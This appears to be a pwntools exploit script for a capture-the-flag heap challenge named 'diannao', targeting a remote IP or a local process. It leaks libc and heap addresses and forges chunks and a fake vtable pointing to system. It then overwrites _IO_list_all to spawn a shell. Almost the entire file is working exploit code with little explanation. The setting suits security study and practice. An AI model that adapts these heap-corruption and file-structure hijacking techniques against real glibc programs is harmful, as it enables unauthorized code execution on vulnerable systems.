from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./diannao")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./diannao")
else:
	p = remote("47.111.59.243","10001")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
	elf = ELF("./diannao")

def menu(choice):
	p.sendlineafter(">>> ",str(choice))

def add(size,name,price):
	menu(1)
	p.sendlineafter("Name length: ",str(size))
	p.sendlineafter("Name: ",name)
	p.sendlineafter("Price: ",str(price))

def comment(index,comment,score):
	menu(2)
	p.sendlineafter("Index: ",str(index))
	p.sendafter(" : ",comment)
	p.sendlineafter("And its score: ",str(score))

def free(index):
	menu(3)
	p.sendlineafter("WHICH IS THE RUBBISH PC? Give me your index: ",str(index))
	
def rename(index,name,serial,payload,need = True):
	menu(4)
	p.sendlineafter("Give me an index: ",str(index))
	p.send(name)
	if need:
		p.sendlineafter("Wanna get more power?(y/n)","yy")
	p.sendafter("DO YOU guys know Digital IC?\n","y")
	p.sendafter("Give me serial: ",serial)
	p.sendafter("Hey Pwner\n",payload)
	"""
	not solve
	"""	

code_base = 0x56555000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}\nb *{b2}\nb __libc_message".format(b1 = hex(code_base + 0x000013B8),b2 = hex(code_base + 0x00001160)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
for i in range(8):
	add(0x10,"a",0xaaa)
for i in range(8):
	free(i)
add(0x8c,"a",0xadbeef) #0
add(0x8c,"a",0xadbeef) #1
add(0x8c,"a",0xadbeef) #2
add(0x8c,"a",0xadbeef) #3
free(0)
free(2)
#debugf()
comment(1,"a",0xcdbeef)
free(1)
p.recvuntil("Comment ")
leak_addr = u32(p.recv(4))
libc.address = leak_addr - 0x61 + 0x68 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
leak_addr = u32(p.recv(4))
heap_base = leak_addr - 0x2d0
log.success("heap_base:" + hex(heap_base))
free(3)
#debugf()
add(0x30,"a",0xeeee) #0
add(0xfc,"a",0xadbeef) #1
vtable_addr = heap_base + 0x31c
payload = p32(0) * 3 + p32(1) + "\x00" * (0x94 - 0x18) + p32(vtable_addr - 0xc) + p32(0) + p32(libc.symbols["system"])
add(0xfc,payload,0xadbeef) #2
add(0xfc,"a",0xadbeef) #3
add(0xfc,"a",0xadbeef) #4
add(0xfc,"a",0xadbeef) #5
add(0xfc,"a",0xadbeef) #6
#debugf()
free(4)
payload = "\x00" * 0xf8 + p32(0x400)
add(0xfc,payload,0xdddd)
free(1)
free(5)
payload = "\x00" * 0xe8 + "sh\x00"
add(0xec,payload,0xdddd) #1
payload = p32(0) * 2 + p32(0) + p32(0x101)
add(0x30,payload,0xeeee) #5
#debugf()
free(2)
free(5)
debugf()
target = libc.symbols["_IO_list_all"]
vtable = 0
payload = p32(0) * 2 + "sh\x00\x00" + p32(0x31) + p32(0) + p32(target - 0x8)
add(0x30,payload,0xeeee) #5
add(0xfc,"a",0xeee)
p.interactive()
